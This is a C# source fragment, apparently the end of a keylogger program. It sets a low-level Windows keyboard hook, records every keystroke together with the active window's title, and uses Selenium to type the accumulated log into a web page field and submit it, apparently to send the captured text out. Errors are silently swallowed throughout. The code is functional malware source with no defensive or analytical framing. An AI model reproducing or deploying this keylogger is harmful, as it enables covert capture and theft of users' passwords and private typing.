                    SbOutput.Insert(0, DateTime.Now.ToString("HHmmss") + "_" + DateTime.Now.Date.ToString("MMdd") + ">");
                    string result = SbOutput.ToString();
                    SbOutput.Clear();

                    input.SendKeys(result);
                    input.SendKeys(OpenQA.Selenium.Keys.Return);
                }
            }
            catch (Exception) { }
        }

        static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                int keyCode = Marshal.ReadInt32(lParam);

                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    string plaintextKey = string.Empty;

                    #region Modifier key
                    if (ShiftKey)
                    {
                        if (!tglShift)
                        {
                            tglShift = true;
                            plaintextKey += "<ON>";
                        }
                    }
                    else
                    {
                        if (tglShift)
                        {
                            tglShift = false;
                            plaintextKey += "<OFF>";
                        }
                    }
                    #endregion

                    if ((System.Windows.Forms.Keys)keyCode != System.Windows.Forms.Keys.RShiftKey && (System.Windows.Forms.Keys)keyCode != System.Windows.Forms.Keys.LShiftKey)
                    {
                        plaintextKey += string.Format("[{0}]", (System.Windows.Forms.Keys)keyCode);
                    }

                    if (_activeWindow == GetTitle())
                    {
                        if (SbOutput.Length > 0)
                        {
                            SbOutput.Append(plaintextKey);
                        }
                        else
                        {
                            var plaintextFullInfo = string.Format("[{0}]%", _activeWindow);
                            SbOutput.Append(plaintextFullInfo);
                            SbOutput.Append(plaintextKey);
                        }
                    }
                    else
                    {
                        _activeWindow = GetTitle();
                        var plaintextFullInfo = string.Format("[{0}]%", _activeWindow);

                        SbOutput.Append(plaintextFullInfo);
                        SbOutput.Append(plaintextKey);
                    }
                }

                return CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
            catch (Exception)
            {
                return CallNextHookEx(_hookId, nCode, wParam, lParam);
            }
        }

        static void Hook()
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, Proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        static string GetTitle()
        {
            IntPtr handle = GetForegroundWindow();
            var sb = new StringBuilder(MAX_SIZE);
            GetWindowText(handle, sb, MAX_SIZE);
            var winText = sb.ToString();
            return winText;
        }

        static void Unhook()
        {
            UnhookWindowsHookEx(_hookId);
        }

        public static bool ShiftKey
        {
            get { return Convert.ToBoolean(GetAsyncKeyState(System.Windows.Forms.Keys.ShiftKey) & 0x8000); }
        }
    }
}
